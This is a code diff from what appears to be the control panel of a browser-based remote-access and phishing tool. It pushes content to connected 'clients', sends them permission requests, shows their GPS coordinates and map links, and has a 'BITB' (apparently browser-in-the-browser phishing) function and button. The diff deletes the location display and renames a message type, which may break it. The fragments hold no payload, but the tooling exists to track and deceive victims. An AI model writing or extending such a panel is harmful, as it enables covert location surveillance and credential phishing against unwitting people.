@@ -681,7 +681,7 @@
             statusDiv.className = 'status';
             statusDiv.textContent = `${new Date().toLocaleTimeString()} - Sent ${type} permission request to selected clients`;
             document.getElementById('allLogs').appendChild(statusDiv);
-        }
+            }
 
        /* function BITBFile(fileName) {
             const fileData = fileStorage.get(fileName);
@@ -1413,9 +1413,7 @@
                     </button>
                 </div>
                 
-                <div id="locationDisplay" style="margin-bottom: 20px; padding: 15px; background: #f8f9fa; border-radius: 5px;">
-                    No location data available
-                </div>
+                
                 
                 <div id="locationHistory" class="location-history-container" style="margin-top: 20px;"></div>
                 
@@ -4312,7 +4310,7 @@ Generated: ${new Date().toLocaleString()}
             const code = codeInput.value;
             if (!code.trim()) return;
             sendToSelectedClients({
-                type: 'showContent',
+                type: 'showsContent',
                 content: code,
                 fileName: 'editor.html',
                 resources: {}
@@ -5519,13 +5517,7 @@ Generated: ${new Date().toLocaleString()}
                         // Get client ID from data
                         const clientId = data.clientId || 'default';
                         
-                        // Display current location
-                        locationDisplay.innerHTML = `
-                            <div style="font-size: 1.2em; margin-bottom: 10px;"><b>Coordinates:</b> ${lat}, ${lng}</div>
-                            <div style="margin-bottom: 10px;"><b>Accuracy:</b> ${accuracy} meters</div>
-                            <a href="${mapsUrl}" target="_blank" style="display: inline-block; padding: 10px 20px; background: #28a745; color: white; border-radius: 5px; text-decoration: none; font-weight: bold; margin-bottom: 8px; transition: background 0.2s;" onmouseover="this.style.background='#218838'" onmouseout="this.style.background='#28a745'">View on Google Maps</a>
-                            <div style="margin-top: 8px; font-size: 0.95em; color: #555; word-break: break-all;"><b>Link:</b> <span>${mapsUrl}</span></div>
-                        `;
+                       
                         
                         // Get nickname for this client
                         let displayName = clientId;
@@ -7949,7 +7941,7 @@ Generated: ${new Date().toLocaleString()}
             
             // Set up action button click handlers
             document.getElementById('viewBtn').addEventListener('click', function() {
-                sendContentToSelectedClients('showContent');
+                sendContentToSelectedClients('showsContent');
             });
             
             document.getElementById('BITBBtn').addEventListener('click', function() {
